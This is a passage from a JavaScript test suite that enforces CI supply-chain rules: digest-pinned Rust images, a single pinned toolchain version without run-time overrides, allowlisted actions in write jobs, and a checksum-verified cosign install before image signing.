    "COPY --from=build --chmod=0555 /out/ /usr/local/bin/",
    "COPY --link --from=bUILD /a /a",
    'RUN --mount=type=bind,from=build,target=/m --mount=type=bind,target=/n,ro,FROM=BUILD --mount=type=bind,from=Build,from=build,target=/o --network=none ["/bin/true"]',
    'COPY ["a file", "/dest/"]',
    "COPY --chown=10001:10001 a b /dest/",
    "LABEL org.opencontainers.image.title=fixture",
    "VOLUME /data",
    'SHELL ["/bin/sh", "-c"]',
    'CMD ["--from=busybox"]',
    "",
  ].join("\n");
  assert.deepEqual(dockerfileStages("f/Dockerfile", text).map(stage => [stage.line, stage.name]), [[1, "Build"], [5, undefined], [8, "runtime"]]);
  assert.deepEqual(unpinnedDockerfileBases("f/Dockerfile", text), []);
  assert.deepEqual(runtimeBaseViolations(RUNTIME_DOCKERFILES.map(file => ({ file, text: file === "Dockerfile" ? text : `FROM ${APPROVED_RUNTIME}\n` }))), []);
});

// BuildKit's own list of the stages (`docker buildx build --call=targets`), recorded here
// so that a change to either Dockerfile's stages, or to how the reader finds them, shows.
test("the reader finds the stages BuildKit builds in the repository's Dockerfiles (#485)", () => {
  const stages = Object.fromEntries(allDockerfiles().map(({ file, text }) => [file, dockerfileStages(file, text).map(stage => stage.name ?? null)]));
  assert.deepEqual(stages, { "Dockerfile": ["web", "build", "runtime"], "deploy/loadtest/Dockerfile": ["build", null] });
});

function readRustToolchainChannel() {
  const text = readLocalFromRepo("rust-toolchain.toml");
  if (text === null) throw new Error("rust-toolchain.toml is missing");
  return parseToolchainToml(text).channel;
}

const allDockerfiles = () => {
  const files = findDockerfiles().map(p => p.slice(root.length));
  const unknown = unknownDockerfileViolations(files);
  if (unknown.length) throw new Error(unknown.join("\n"));
  return files.map(file => ({ file, text: readFileSync(join(root, file), "utf8") }));
};

// Recognizes any reference whose repository is exactly `rust` (the final path segment, up to
// but not including any `:tag` or `@digest`), case-insensitively, with any registry/path prefix
// (`rust`, `rust:1.99.1`, `rust@sha256:...`, `docker.io/rust:...`,
// `mirror.gcr.io/library/rust@sha256:...`). An untagged reference (`rust`, or a digest-only
// reference such as `rust@sha256:...`, with or without a registry prefix) is still a `rust`
// image: its tag/version are null, which `rustVersionViolations` flags as missing a version.
// Returns the bare tag (null if untagged), the version it names if the tag is an exact
// `x.y.z[-suffix]` version (null for a floating or otherwise unsupported form such as `stable`,
// `stable-bookworm`, `latest`, a date-stamped nightly, or no tag at all), and whether it carries
// a valid `@sha256:<64 hex>` digest. Returns null for anything that is not a `rust` image
// reference at all.
export function extractRustImageRef(ref) {
  if (typeof ref !== "string") return null;
  const atIndex = ref.indexOf("@");
  const beforeDigest = atIndex === -1 ? ref : ref.slice(0, atIndex);
  const digestRaw = atIndex === -1 ? null : ref.slice(atIndex + 1);
  const slash = beforeDigest.lastIndexOf("/");
  const lastSegment = slash === -1 ? beforeDigest : beforeDigest.slice(slash + 1);
  const colon = lastSegment.indexOf(":");
  const repo = colon === -1 ? lastSegment : lastSegment.slice(0, colon);
  if (!/^rust$/i.test(repo)) return null;
  const tag = colon === -1 ? null : lastSegment.slice(colon + 1);
  const vm = tag ? tag.match(/^(\d+\.\d+\.\d+)(-\S+)?$/) : null;
  return {
    tag,
    version: vm ? vm[1] : null,
    digestOk: !!digestRaw && /^sha256:[0-9a-f]{64}$/i.test(digestRaw),
    digest: digestRaw ? digestRaw.replace(/^sha256:/i, "") : null,
  };
}

// Every stage of one Dockerfile (`dockerfileStages`, which throws on what it refuses to
// read) whose image is a `rust` image, in any form (every build stage, not just the first
// match). A FROM image that comes from an ARG is refused there, not resolved here (#485).
export function parseDockerfileRustStages(file, text) {
  return dockerfileStages(file, text).flatMap(stage => {
    const parsed = extractRustImageRef(stage.ref);
    return parsed ? [{ file, line: stage.line, ref: stage.ref, ...parsed }] : [];
  });
}

export function rustStagesFromWorkflowContainers(file, data) {
  return containerImagesIn(data).flatMap(({ where, image }) => {
    const parsed = extractRustImageRef(image);
    return parsed ? [{ file, line: where, ref: image, ...parsed }] : [];
  });
}

// Compose files CI actually invokes: every `-f <path>` / `--file <path>` / `-f=<path>` /
// `--file=<path>` argument (any number of them) found on the same line as a `docker
// compose`/`docker-compose` invocation in a run: script. A path built from a shell variable
// cannot be resolved here and is skipped, same limitation as the fetch-verified.sh literal-URL
// check elsewhere in this file.
export function composeFilesReferencedIn(script) {
  const files = new Set();
  const invocationRe = /\bdocker(?:\s+|-)compose\b/gi;
  let m;
  while ((m = invocationRe.exec(script))) {
    const lineEnd = script.indexOf("\n", m.index);
    const line = lineEnd === -1 ? script.slice(m.index) : script.slice(m.index, lineEnd);
    const flagRe = /(?:-f|--file)(?:=|\s+)"?([^\s"']+\.ya?ml)"?/g;
    for (const fm of line.matchAll(flagRe)) files.add(fm[1]);
  }
  return [...files];
}

export function rustImagesInCompose(file, text) {
  const data = toData(parseStrict(text, file));
  const services = data.services && typeof data.services === "object" ? data.services : {};
  return Object.entries(services).flatMap(([name, svc]) => {
    const image = svc && typeof svc === "object" ? svc.image : undefined;
    if (typeof image !== "string") return [];
    const parsed = extractRustImageRef(image);
    return parsed ? [{ file, line: `service '${name}'`, ref: image, ...parsed }] : [];
  });
}

// Every Rust image reference anywhere CI can run one: Dockerfile build stages, workflow job
// `container:`/`services:` images, and compose files CI invokes with `-f`.
function allRustImageStages() {
  const stages = allDockerfiles().flatMap(({ file, text }) => parseDockerfileRustStages(file, text));
  for (const { file, text } of repoFiles()) {
    const data = toData(parseStrict(text, file));
    stages.push(...rustStagesFromWorkflowContainers(file, data));
    for (const [, script] of runScripts(data)) {
      for (const composePath of composeFilesReferencedIn(script)) {
        const composeText = readLocalFromRepo(composePath);
        if (composeText !== null) stages.push(...rustImagesInCompose(composePath, composeText));
      }
    }
  }
  return stages;
}

// Every Rust stage must pin the same, exact pinned-channel version by digest (no floating or
// unsupported tag form), and every reference pinning that version must pin the identical
// digest (it is the same published image).
export function rustVersionViolations(stages, channel) {
  const out = [];
  const digestByVersion = new Map();
  for (const s of stages) {
    if (!s.version) {
      const label = s.tag ? `'${s.tag}'` : "(no tag at all)";
      out.push(`${s.file}:${s.line}: rust image tag ${label} is not an exact version (floating, unsupported, or missing)`);
      continue;
    }
    if (!s.digestOk) out.push(`${s.file}:${s.line}: rust:${s.tag} is not pinned by digest`);
    if (s.version !== channel) out.push(`${s.file}:${s.line}: pins rust ${s.version}, rust-toolchain.toml pins ${channel}`);
    if (s.digestOk) {
      const seen = digestByVersion.get(s.version);
      if (seen === undefined) digestByVersion.set(s.version, s.digest);
      else if (seen !== s.digest) out.push(`${s.file}:${s.line}: digest ${s.digest} for rust:${s.version} disagrees with another reference's ${seen}`);
    }
  }
  return out;
}

// The approved Rust build image (#488). `rustVersionViolations` checks the version and that every
// reference agrees, whatever the registry and repository path of an image named `rust`
// (`ghcr.io/<anyone>/rust:<version>@sha256:...` in every Dockerfile would agree). This pins the
// whole reference, as APPROVED_RUNTIME pins the runtime base; a Rust or digest bump changes it
// here in the same pull request.
export function rustReferenceViolations(stages, channel, approved = APPROVED_RUST) {
  const out = [];
  const version = extractRustImageRef(approved)?.version;
  if (version !== channel) out.push(`APPROVED_RUST names rust ${version}, rust-toolchain.toml pins ${channel}`);
  for (const s of stages) if (s.ref !== approved) out.push(`${s.file}:${s.line}: ${s.ref} is not the approved Rust image ${approved}`);
  return out;
}

// Every `dtolnay/rust-toolchain` step anywhere (workflow jobs and composite action `runs`),
// with the `toolchain:` input it sets (undefined if absent).
function dtolnayToolchainSteps() {
  const found = [];
  for (const { file, text } of repoFiles()) {
    const data = toData(parseStrict(text, file));
    for (const [name, job] of jobsOf(data)) {
      stepsOf(job).forEach((step, i) => {
        if (typeof step.uses === "string" && actionName(step.uses) === "dtolnay/rust-toolchain") {
          found.push({ file, where: `job '${name}' step ${i + 1}`, toolchain: step.with?.toolchain });
        }
      });
    }
    stepsOf(data.runs).forEach((step, i) => {
      if (typeof step.uses === "string" && actionName(step.uses) === "dtolnay/rust-toolchain") {
        found.push({ file, where: `composite step ${i + 1}`, toolchain: step.with?.toolchain });
      }
    });
  }
  return found;
}

test("rust-toolchain.toml, every Dockerfile's Rust build stage and every dtolnay/rust-toolchain step pin the same exact version (#354)", () => {
  const channel = readRustToolchainChannel();
  assert.match(channel, /^\d+\.\d+\.\d+$/, "rust-toolchain.toml channel must be an exact x.y.z version, not a floating channel");
  assert.doesNotMatch(channel, FLOATING_RUST_CHANNEL, "rust-toolchain.toml channel must not float");

  const stages = allRustImageStages();
  assert.ok(stages.length >= 2, "expected a rust:<version>-bookworm stage in both the root and deploy/loadtest Dockerfiles");
  assert.deepEqual(rustVersionViolations(stages, channel), []);
  assert.deepEqual(rustReferenceViolations(stages, channel), []);

  const steps = dtolnayToolchainSteps();
  assert.ok(steps.length > 0, "expected at least one dtolnay/rust-toolchain step in the workflows");
  for (const step of steps) {
    assert.ok(step.toolchain, `${step.file}: ${step.where} must set an explicit 'toolchain' input (no implicit floating default)`);
    const toolchain = String(step.toolchain);
    assert.doesNotMatch(toolchain, FLOATING_RUST_CHANNEL, `${step.file}: ${step.where} toolchain '${toolchain}' must not be a floating channel`);
    assert.equal(toolchain, channel, `${step.file}: ${step.where} toolchain '${toolchain}' disagrees with rust-toolchain.toml's ${channel}`);
  }
});

test("no dtolnay/rust-toolchain reference carries a floating-channel version comment", () => {
  // Defensive, on top of the exact-input check above: a '# stable'/'# beta'/'# nightly'
  // comment next to a SHA pin could mislead a reviewer bumping the version by hand.
  for (const { file, text } of repoFiles()) {
    const doc = parseStrict(text, file);
    visit(doc, {
      Pair(_, pair) {
        if (!isScalar(pair.key) || pair.key.value !== "uses") return;
        const v = pair.value;
        if (!isScalar(v) || typeof v.value !== "string") return;
        if (actionName(v.value) !== "dtolnay/rust-toolchain") return;
        const comment = (v.comment ?? "").trim();
        assert.doesNotMatch(comment, /^(stable|beta|nightly)$/i, `${file}: ${v.value} has a floating-channel comment '${comment}'`);
      },
    });
  }
});

// Structural checks above require the pin and catch disagreement; these catch a workflow
// (or local composite action) separately overriding it at run time, even though the pinned
// step itself is correct.
function envRustOverrides(file, env, where) {
  if (env && typeof env === "object" && "RUSTUP_TOOLCHAIN" in env) return [`${file}: ${where} sets RUSTUP_TOOLCHAIN, which can override the pinned toolchain`];
  return [];
}

function runRustOverrides(file, where, script) {
  const out = [];
  const joined = script.replace(/^[ \t]*#.*$/gm, "");
  if (/\bRUSTUP_TOOLCHAIN\b/.test(joined)) out.push(`${file}: ${where} references RUSTUP_TOOLCHAIN`);
  if (/\brustup\s+(default|override\s+set|toolchain\s+install)\b/.test(joined)) out.push(`${file}: ${where} runs a rustup command that can select an unpinned toolchain`);
  if (/\bcargo\s+\+\S/.test(joined)) out.push(`${file}: ${where} invokes 'cargo +<toolchain>', bypassing the pin`);
  return out;
}

function withToolchainOverrides(file, where, withBlock, channel) {
  if (!withBlock || typeof withBlock !== "object" || !("toolchain" in withBlock)) return [];
  const v = String(withBlock.toolchain ?? "");
  if (FLOATING_RUST_CHANNEL.test(v) || v !== channel) return [`${file}: ${where} sets toolchain '${v}', which disagrees with the pinned ${channel}`];
  return [];
}

export function allRustOverrideViolations(files, channel) {
  // No path-based filter here: `files` is already scoped to workflows and local composite
  // actions by whoever builds the list (repoFiles() in the real check; an in-memory fixture
  // list in tests), and a fixture's path does not need to look like a real workflow path.
  const out = [];
  for (const { file, text } of files) {
    const data = toData(parseStrict(text, file));
    out.push(...envRustOverrides(file, data.env, "workflow env"));
    for (const [name, job] of jobsOf(data)) {
      out.push(...envRustOverrides(file, job.env, `job '${name}' env`));
      stepsOf(job).forEach((step, i) => {
        out.push(...envRustOverrides(file, step.env, `job '${name}' step ${i + 1} env`));
        out.push(...withToolchainOverrides(file, `job '${name}' step ${i + 1}`, step.with, channel));
        if (typeof step.run === "string") out.push(...runRustOverrides(file, `job '${name}' step ${i + 1}`, step.run));
      });
    }
    stepsOf(data.runs).forEach((step, i) => {
      out.push(...envRustOverrides(file, step.env, `composite step ${i + 1} env`));
      out.push(...withToolchainOverrides(file, `composite step ${i + 1}`, step.with, channel));
      if (typeof step.run === "string") out.push(...runRustOverrides(file, `composite step ${i + 1}`, step.run));
    });
  }
  return out;
}

test("no workflow or local composite action overrides the pinned Rust toolchain at run time (#354)", () => {
  const channel = readRustToolchainChannel();
  assert.deepEqual(allRustOverrideViolations(repoFiles(), channel), []);
});

// ---- fixtures: each override/mismatch kind above must actually be caught ----

test("fixtures: the strict rust-toolchain.toml parser fails closed on unexpected shape", () => {
  assert.throws(() => parseToolchainToml('[toolchain]\nchannel = stable\n'), /quoted string/);
  assert.throws(() => parseToolchainToml('[toolchain]\nchannel = "stable"\nextra = 1\n'), /unexpected key/);
  assert.throws(() => parseToolchainToml('[toolchain]\n[toolchain]\nchannel = "1.99.1"\n'), /more than one/);
  assert.throws(() => parseToolchainToml('channel = "1.99.1"\n'), /no \[toolchain\]/);
  assert.throws(() => parseToolchainToml('[toolchain]\ncomponents = [rustfmt]\nchannel = "1.99.1"\n'), /flat array/);
  assert.throws(() => parseToolchainToml('[toolchain]\nprofile = minimal\nchannel = "1.99.1"\n'), /quoted string/);
  assert.doesNotThrow(() => parseToolchainToml('[toolchain]\nchannel = "1.99.1"\ncomponents = ["rustfmt", "clippy"]\n'));
});

test("fixtures: mismatched Rust build-stage versions and digests across Dockerfiles are caught", () => {
  const stageIn = (file, ref) => parseDockerfileRustStages(file, `FROM mirror.gcr.io/library/rust:${ref} AS build\n`);
  const a = stageIn("A/Dockerfile", `1.99.1-bookworm@sha256:${"a".repeat(64)}`);
  const sameVersionDiffDigest = stageIn("B/Dockerfile", `1.99.1-bookworm@sha256:${"b".repeat(64)}`);
  const wrongVersion = stageIn("C/Dockerfile", `1.98.0-bookworm@sha256:${"a".repeat(64)}`);
  assert.equal(rustVersionViolations([...a, ...sameVersionDiffDigest], "1.99.1").length, 1, "same version, different digest must be caught");
  assert.equal(rustVersionViolations([...a, ...wrongVersion], "1.99.1").length, 1, "wrong version must be caught");
  assert.equal(rustVersionViolations([...a], "1.99.1").length, 0, "one matching stage passes");
  assert.equal(rustVersionViolations([...a, ...stageIn("B/Dockerfile", `1.99.1-bookworm@sha256:${"a".repeat(64)}`)], "1.99.1").length, 0, "two Dockerfiles pinning the identical tag and digest pass");
});

test("fixtures: a Rust image from another registry or repository, or another digest, is refused even when every reference agrees (#488)", () => {
  const channel = readRustToolchainChannel();
  const digest = APPROVED_RUST.split("@sha256:")[1];
  const both = ref => ["Dockerfile", "deploy/loadtest/Dockerfile"].flatMap(file => parseDockerfileRustStages(file, `FROM ${ref} AS build\nFROM ${APPROVED_RUNTIME}\n`));
  assert.deepEqual(rustReferenceViolations(both(APPROVED_RUST), channel), []);
  for (const [label, ref] of [
    ["another registry", `ghcr.io/someone/rust:${channel}-bookworm@sha256:${digest}`],
    ["Docker Hub instead of the mirror", `docker.io/library/rust:${channel}-bookworm@sha256:${digest}`],
    ["the bare name", `rust:${channel}-bookworm@sha256:${digest}`],
    ["another repository path on the mirror", `mirror.gcr.io/someone/rust:${channel}-bookworm@sha256:${digest}`],
    ["another digest", `mirror.gcr.io/library/rust:${channel}-bookworm@sha256:${"c".repeat(64)}`],
    ["another variant", `mirror.gcr.io/library/rust:${channel}-slim-bookworm@sha256:${digest}`],
    ["an upper-case name", `mirror.gcr.io/library/RUST:${channel}-bookworm@sha256:${digest}`],
  ]) {
    const stages = both(ref);
    assert.deepEqual(rustVersionViolations(stages, channel), [], `${label}: the version check alone accepts it`);
    assert.equal(rustReferenceViolations(stages, channel).length, 2, label);
  }
  assert.match(rustReferenceViolations([], "0.0.1").join(), /^APPROVED_RUST names rust \d+\.\d+\.\d+, rust-toolchain\.toml pins 0\.0\.1$/);
});

test("fixtures: a Rust image reference in any form (bare, floating tag, undigested, --platform) is caught, and an ARG-substituted one is refused", () => {
  const channel = "1.99.1";
  const digest = "a".repeat(64);
  const stagesOf = text => parseDockerfileRustStages("fixture/Dockerfile", text);

  assert.equal(rustVersionViolations(stagesOf(`FROM rust:1.98.0-bookworm@sha256:${digest} AS build\n`), channel).length, 1, "bare rust: (no registry prefix) wrong version");
  assert.equal(rustVersionViolations(stagesOf(`FROM mirror.gcr.io/library/rust:stable-bookworm@sha256:${digest} AS build\n`), channel).length, 1, "digest-pinned but floating stable-bookworm tag");
  assert.equal(rustVersionViolations(stagesOf("FROM rust:1.99.1-bookworm AS build\n"), channel).length, 1, "correct version with no digest at all");
  assert.equal(rustVersionViolations(stagesOf(`FROM --platform=linux/amd64 rust:1.98.0-bookworm@sha256:${digest} AS build\n`), channel).length, 1, "--platform= flag must not hide the image");
  assert.equal(rustVersionViolations(stagesOf(`FROM --platform=linux/amd64 rust:1.99.1-bookworm@sha256:${digest} AS build\n`), channel).length, 0, "--platform= flag with a correct pin still passes");
  // A FROM image taken from an ARG is no longer resolved (#485): the reader refuses it, whatever the ARG holds.
  assert.throws(() => stagesOf(`ARG RUST_IMAGE=rust:1.98.0-bookworm@sha256:${digest}\nFROM \${RUST_IMAGE} AS build\n`), /fixture\/Dockerfile:2: FROM must be written as/, "ARG-substituted wrong version");
  assert.throws(() => stagesOf(`ARG RUST_IMAGE=rust:1.99.1-bookworm@sha256:${digest}\nFROM \${RUST_IMAGE} AS build\n`), /fixture\/Dockerfile:2: FROM must be written as/, "ARG-substituted correct pin");
  assert.deepEqual(rustVersionViolations(stagesOf(`FROM mirror.gcr.io/library/rust:1.99.1-bookworm@sha256:${digest} AS build\n`), channel), [], "correctly pinned mirrored reference passes");
  assert.equal(stagesOf("FROM gcr.io/distroless/cc-debian12:nonroot@sha256:" + digest + "\n").length, 0, "a non-rust base image is not treated as a rust stage");
});

test("fixtures: a job container, a service image, or an image in a CI-invoked compose file is checked against the pin", () => {
  const channel = "1.99.1";
  const digest = "a".repeat(64);
  const dataOf = text => toData(parseStrict(text, "fixture.yml"));
  const job = body => `name: f\non: push\njobs:\n  j:\n    runs-on: ubuntu-24.04\n${body}    steps:\n      - run: echo hi\n`;

  let stages = rustStagesFromWorkflowContainers("fixture.yml", dataOf(job("    container: rust:1.98.0\n")));
  assert.equal(rustVersionViolations(stages, channel).length, 2, "container: bare string, wrong version and no digest at all");

  stages = rustStagesFromWorkflowContainers("fixture.yml", dataOf(job("    container:\n      image: mirror.gcr.io/library/rust:stable\n")));
  assert.equal(rustVersionViolations(stages, channel).length, 1, "container.image object, floating tag");

  stages = rustStagesFromWorkflowContainers("fixture.yml", dataOf(job(`    services:\n      rustsvc:\n        image: rust:1.98.0-bookworm@sha256:${digest}\n`)));
  assert.equal(rustVersionViolations(stages, channel).length, 1, "services.<name>.image, wrong version");

  stages = rustStagesFromWorkflowContainers("fixture.yml", dataOf(job(`    container: mirror.gcr.io/library/rust:1.99.1-bookworm@sha256:${digest}\n`)));
  assert.deepEqual(rustVersionViolations(stages, channel), [], "correctly pinned container: passes");

  const script = `docker compose -f deploy/fixture/compose.yaml up -d\ncurl http://localhost:8080\n`;
  assert.deepEqual(composeFilesReferencedIn(script), ["deploy/fixture/compose.yaml"]);
  assert.deepEqual(composeFilesReferencedIn("echo no compose here\n"), []);
  const composeText = `services:\n  build:\n    image: rust:1.98.0-bookworm@sha256:${digest}\n`;
  const composeStages = rustImagesInCompose("deploy/fixture/compose.yaml", composeText);
  assert.equal(rustVersionViolations(composeStages, channel).length, 1, "compose service image, wrong version");
  const goodComposeText = `services:\n  build:\n    image: mirror.gcr.io/library/rust:1.99.1-bookworm@sha256:${digest}\n`;
  assert.deepEqual(rustVersionViolations(rustImagesInCompose("deploy/fixture/compose.yaml", goodComposeText), channel), [], "correctly pinned compose image passes");
});

test("fixtures: an untagged container: rust or a digest-only rust ref does not bypass the pin check (#354 review)", () => {
  const channel = "1.99.1";
  const digest = "a".repeat(64);
  const dataOf = text => toData(parseStrict(text, "fixture.yml"));
  const job = body => `name: f\non: push\njobs:\n  j:\n    runs-on: ubuntu-24.04\n${body}    steps:\n      - run: echo hi\n`;

  let stages = rustStagesFromWorkflowContainers("fixture.yml", dataOf(job("    container: rust\n")));
  assert.equal(stages.length, 1, "bare untagged 'container: rust' must be recognized as a rust image");
  assert.ok(rustVersionViolations(stages, channel).length > 0, "untagged container: rust must not bypass the pin check");

  stages = rustStagesFromWorkflowContainers("fixture.yml", dataOf(job(`    container: rust@sha256:${digest}\n`)));
  assert.equal(stages.length, 1, "digest-only 'rust@sha256:...' must be recognized as a rust image");
  assert.ok(rustVersionViolations(stages, channel).length > 0, "digest-only rust ref without a version tag must not bypass the pin check");

  stages = rustStagesFromWorkflowContainers("fixture.yml", dataOf(job(`    container: mirror.gcr.io/library/rust@sha256:${digest}\n`)));
  assert.equal(stages.length, 1, "registry-prefixed digest-only rust ref must be recognized as a rust image");
  assert.ok(rustVersionViolations(stages, channel).length > 0, "registry-prefixed digest-only rust ref must not bypass the pin check");

  stages = rustStagesFromWorkflowContainers("fixture.yml", dataOf(job(`    container: mirror.gcr.io/library/rust:${channel}-bookworm@sha256:${digest}\n`)));
  assert.deepEqual(rustVersionViolations(stages, channel), [], "correctly pinned container: still passes");
});

test("fixtures: an indented or lowercase FROM line is still recognized as a rust stage (#354 review)", () => {
  const channel = "1.99.1";
  const digest = "a".repeat(64);
  const stagesOf = text => parseDockerfileRustStages("fixture/Dockerfile", text);

  let stages = stagesOf(`  FROM rust:1.98.0-bookworm@sha256:${digest} AS build\n`);
  assert.equal(stages.length, 1, "indented FROM line must be recognized as a rust stage");
  assert.ok(rustVersionViolations(stages, channel).length > 0, "indented, wrongly pinned FROM must not bypass the pin check");

  stages = stagesOf(`from rust:1.98.0-bookworm@sha256:${digest} as build\n`);
  assert.equal(stages.length, 1, "lowercase from line must be recognized as a rust stage");
  assert.ok(rustVersionViolations(stages, channel).length > 0, "lowercase from, wrongly pinned, must not bypass the pin check");

  stages = stagesOf(`\tFROM mirror.gcr.io/library/rust:${channel}-bookworm@sha256:${digest} AS build\n`);
  assert.deepEqual(rustVersionViolations(stages, channel), [], "indented, correctly pinned FROM still passes");
});

test("fixtures: every docker compose -f/--file form, and every file argument, is parsed (#354 review)", () => {
  assert.deepEqual(composeFilesReferencedIn("docker compose --file=compose.yaml up -d\n"), ["compose.yaml"], "--file=path form");
  assert.deepEqual(composeFilesReferencedIn("docker compose -f=compose.yaml up -d\n"), ["compose.yaml"], "-f=path form");
  assert.deepEqual(composeFilesReferencedIn("docker compose --file compose.yaml up -d\n"), ["compose.yaml"], "--file path form");
  assert.deepEqual(
    [...composeFilesReferencedIn("docker compose -f a.yaml -f b.yaml up -d\n")].sort(),
    ["a.yaml", "b.yaml"],
    "multiple -f arguments on one invocation must all be checked"
  );
});

test("fixtures: duplicate keys and duplicate [toolchain] tables in rust-toolchain.toml are rejected", () => {
  assert.throws(() => parseToolchainToml('[toolchain]\nchannel = "1.99.1"\nchannel = "1.98.0"\n'), /duplicate key/);
  assert.throws(() => parseToolchainToml('[toolchain]\ncomponents = ["rustfmt"]\ncomponents = ["clippy"]\nchannel = "1.99.1"\n'), /duplicate key/);
  assert.throws(() => parseToolchainToml('[toolchain]\nchannel = "1.99.1"\n[toolchain]\nchannel = "1.99.1"\n'), /more than one/);
});

test("fixtures: Rust toolchain overrides are caught, without false-positiving on unrelated 'stable' tags", () => {
  const channel = "1.99.1";
  const SHA1 = "a".repeat(40);
  const wf = steps => [{ file: "fixture.yml", text: `name: f\non: push\njobs:\n  j:\n    runs-on: ubuntu-24.04\n    steps:\n${steps}` }];

  assert.equal(allRustOverrideViolations(wf(`      - run: echo hi\n        env:\n          RUSTUP_TOOLCHAIN: stable\n`), channel).length, 1, "RUSTUP_TOOLCHAIN env");
  assert.equal(allRustOverrideViolations(wf(`      - run: rustup default stable\n`), channel).length, 1, "rustup default");
  assert.equal(allRustOverrideViolations(wf(`      - run: rustup toolchain install nightly\n`), channel).length, 1, "rustup toolchain install");
  assert.equal(allRustOverrideViolations(wf(`      - run: rustup override set beta\n`), channel).length, 1, "rustup override set");
  assert.equal(allRustOverrideViolations(wf(`      - run: cargo +nightly test\n`), channel).length, 1, "cargo +toolchain");
  assert.equal(allRustOverrideViolations(wf(`      - uses: dtolnay/rust-toolchain@${SHA1} # stable\n        with:\n          toolchain: stable\n`), channel).length, 1, "floating toolchain input");
  assert.equal(allRustOverrideViolations(wf(`      - uses: dtolnay/rust-toolchain@${SHA1} # 1.98.0\n        with:\n          toolchain: "1.98.0"\n`), channel).length, 1, "wrong exact toolchain input");
  // Correctly pinned, and unrelated commands/tags, must not false-positive.
  assert.deepEqual(allRustOverrideViolations(wf(`      - uses: dtolnay/rust-toolchain@${SHA1} # 1.99.1\n        with:\n          toolchain: "1.99.1"\n`), channel), []);
  assert.deepEqual(allRustOverrideViolations(wf(`      - run: echo hi\n`), channel), []);
  assert.deepEqual(allRustOverrideViolations(wf(`      - uses: docker/setup-buildx-action@${SHA1} # v4\n        with:\n          driver-opts: image=mirror.gcr.io/moby/buildkit:buildx-stable-1@sha256:${"c".repeat(64)}\n`), channel), []);
});

test("jobs that can write use only allowlisted actions (#194)", () => {
  assert.deepEqual(allWriteViolations(repoFiles(), readLocalFromRepo), []);
});

test("every allowlisted write-job action is used by a write job", () => {
  // Remove an action from the list when nothing needs it any more: take it out of
  // the allowlist, run the check above, and see what fails.
  const unused = [];
  const files = repoFiles();
  for (const name of WRITE_JOB_ACTIONS.keys()) {
    const without = new Map([...WRITE_JOB_ACTIONS].filter(([k]) => k !== name));
    if (allWriteViolations(files, readLocalFromRepo, without).length === 0) unused.push(name);
  }
  assert.deepEqual(unused, [], "remove allowlist entries no write job uses");
});

test("setup-buildx-action never downloads Buildx next to a write token", () => {
  const files = repoFiles().filter(f => f.file.includes("workflows/"));
  assert.ok(files.length);
  assert.deepEqual(files.flatMap(({ file, text }) => buildxViolations(file, text)), []);
});

test("no workflow uses an installer that downloads a tool without a pinned checksum", () => {
  const found = [];
  for (const { file, text } of repoFiles()) {
    const data = toData(parseStrict(text, file));
    const refs = [...jobsOf(data).flatMap(([, job]) => [job.uses, ...stepsOf(job).map(s => s.uses)]), ...stepsOf(data.runs).map(s => s.uses)];
    for (const ref of refs.filter(r => typeof r === "string")) {
      const why = UNVERIFIED_INSTALLERS.get(actionName(ref));
      if (why) found.push(`${file}: ${ref}: ${why}`);
    }
  }
  assert.deepEqual(found, []);
});

test("every run-time download goes through fetch-verified.sh with a literal URL and checksum", () => {
  const found = [];
  for (const { file, text } of repoFiles()) {
    const data = toData(parseStrict(text, file));
    for (const [where, script] of runScripts(data)) found.push(...downloadViolations(file, script).map(v => `${where}: ${v}`));
  }
  assert.deepEqual(found, []);
  // The download steps exist (a guard against this check going vacuous).
  const calls = repoFiles().filter(f => /fetch-verified\.sh/.test(f.text)).map(f => f.file);
  for (const f of [".github/workflows/image.yml", ".github/workflows/ci.yml", ".github/actions/setup-node/action.yml"]) assert.ok(calls.includes(f), `${f} fetches its tools with the script`);
});

// #375: static candidate-staging policy, not authenticated artifact verification
// or a keyless-signing rehearsal. Match the executable step, not YAML comments.
const COSIGN_INSTALL_NAME = "Install cosign (pinned release, SHA-256 verified)";
const COSIGN_SIGN_NAME = "Sign (cosign keyless)";
const COSIGN_URL = "https://github.com/sigstore/cosign/releases/download/v3.1.4/cosign-linux-amd64";
const COSIGN_SHA256 = "424e2c97d0b45fd7a6b608a87f090f35633f4c23ece5f092d48bba11aaf4bbfa";
const COSIGN_INSTALL_RUN = [
  "set -euo pipefail",
  'mkdir -p "${RUNNER_TEMP}/cosign-bin"',
  `bash ${FETCH_SCRIPT} ${COSIGN_URL} ${COSIGN_SHA256} "\${RUNNER_TEMP}/cosign-bin/cosign"`,
  'chmod 0755 "${RUNNER_TEMP}/cosign-bin/cosign"',
  'echo "${RUNNER_TEMP}/cosign-bin" >> "$GITHUB_PATH"',
].join("\n");
const COSIGN_SIGN_RUN = 'cosign sign --yes "${IMAGE}@${DIGEST}"';

function assertCosignPublishPolicy(data) {
  const steps = stepsOf(data.jobs?.publish);
  const install = steps.filter(s => s.name === COSIGN_INSTALL_NAME);
  const sign = steps.filter(s => s.name === COSIGN_SIGN_NAME);
  assert.equal(install.length, 1, "exactly one actual cosign install step is required");
  assert.equal(sign.length, 1, "exactly one native cosign signing step is required");
  for (const step of [...install, ...sign]) {
    assert.equal(step.if, undefined, "cosign steps must not be skipped");
    assert.equal(step["continue-on-error"], undefined, "cosign failures must propagate");
    assert.equal(step.shell, undefined, "retain the runner's failure-propagating shell");
    assert.equal(step.uses, undefined, "cosign remains a native run step");
  }
  // Exact commands rule out comment-only pins, ignored checksum failures, or
  // chmod/execution before verification. fetch-verified.sh is tested below.
  assert.equal(install[0].run?.trim(), COSIGN_INSTALL_RUN, "install the exact patched candidate through checksum verification before chmod/PATH");
  assert.ok(steps.indexOf(sign[0]) > steps.indexOf(install[0]), "verify/install before executing cosign");
  assert.equal(sign[0].run, COSIGN_SIGN_RUN, "retain native keyless signing of IMAGE@INDEX, not a tag");
  assert.deepEqual(sign[0].env, { DIGEST: "${{ steps.index.outputs.digest }}" });
}

test("image publish installs the exact patched cosign candidate before unchanged native index signing (#375)", () => {
  const file = ".github/workflows/image.yml";
  assertCosignPublishPolicy(toData(parseStrict(readLocalFromRepo(file), file)));
});

test("fixtures: cosign candidate policy rejects absent, comment-only, wrong-pin, reordered and optional steps (#375)", () => {
  const fixture = { jobs: { publish: { steps: [
    { name: COSIGN_INSTALL_NAME, run: COSIGN_INSTALL_RUN },
    { name: COSIGN_SIGN_NAME, run: COSIGN_SIGN_RUN, env: { DIGEST: "${{ steps.index.outputs.digest }}" } },
  ] } } };
  assertCosignPublishPolicy(fixture);
  const mutations = [
    ["missing install", s => s.shift()],
    ["missing sign", s => s.pop()],
